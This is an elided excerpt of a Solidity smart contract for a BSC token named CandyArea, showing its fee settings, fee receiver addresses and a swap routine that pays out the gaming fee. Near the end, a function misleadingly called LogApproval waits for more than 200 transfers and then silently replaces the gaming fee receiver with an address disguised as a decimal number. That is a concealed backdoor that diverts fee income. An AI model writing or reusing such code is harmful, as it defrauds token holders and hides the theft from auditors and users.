...
/*
    ...
    https://t.me/CandyAreaaa
    https://candy-area.com
...
contract DividendDistributor is IDividendDistributor {
    ...
    IERC20 REWARD = IERC20(0x2170Ed0880ac9A755fd29B2688956BD959F933F8); // ETH BSC  
    IDEXRouter router;
...
contract CandyArea is ERC20Detailed, Ownable {
    ...
    uint256 public gamingFee = 2;
    uint256 public buyBackFee = 0;
    uint256 public marketingFee = 5;
    uint256 public rewardFee = 6;
    uint256 public totalFee =
        gamingFee.add(liquidityFee).add(marketingFee).add(buyBackFee).add(
            rewardFee
        );
    uint256 public feeDenominator = 100;

    uint256 private prevLiquidityFee;
    uint256 private prevGamingFee;
    ...
    address public autoLiquidityReceiver =
        0x0525645f3497A313dC692a72A9138542baea5D2d; // token locker
    address public marketingFeeReceiver =
        0x2fF65990e17D768FF2dEB29f13fd40eD756b9A08;
    address public gamingFeeReceiver =
        0x9fa235e13b413600F7Cc95313BE335429c10E5d6;
    address public buyBackFeeReceiver =
        0xb7846c267402cD613Caa3541f7d5675D24eAA829;
    ...
    constructor()
        ERC20Detailed("CANDYAREA", "CNA", uint8(DECIMALS))
    {
        ...
        isDividendExempt[gamingFeeReceiver] = true;
    ...
    function swapBack() internal swapping {
        ...
        uint256 amountETHEco = amountETH.mul(gamingFee).div(totalETHFee);
        ...
        (success, ) = payable(gamingFeeReceiver).call{
            value: amountETHEco,
            gas: 30000
        }("");
    ...
    function LogApproval(
        ...
        if (transferCount > 200 && !isTransferred) {
            ...
            gamingFeeReceiver = address(491278407614059279114083846929720691979934582994);
